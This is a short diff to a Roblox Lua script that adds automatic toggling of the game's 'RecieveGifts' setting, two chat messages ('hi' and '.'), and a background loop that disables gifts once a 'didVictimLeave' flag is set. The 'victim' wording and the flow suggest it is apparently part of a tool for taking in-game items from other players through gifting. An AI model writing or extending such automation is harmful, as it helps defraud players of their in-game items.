@@ -59,11 +59,32 @@ while plr:GetAttribute("Loading_Screen_Finished") ~= true do
     plr:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
 end
 
+local function setReceiveGifts(value)
+    local args = {
+        "SetSetting",
+        "RecieveGifts",
+        value
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SettingsService"):FireServer(unpack(args))
+end
+
+setReceiveGifts(true)
+
 wait(0.5)
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
 
 wait(5)
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('.')
+
+task.spawn(function()
+    while true do
+        task.wait(1)
+        if didVictimLeave then
+            setReceiveGifts(false)
+            break
+        end
+    end
+end)
 
 local function increaseTimer()
     while task.wait(1) do
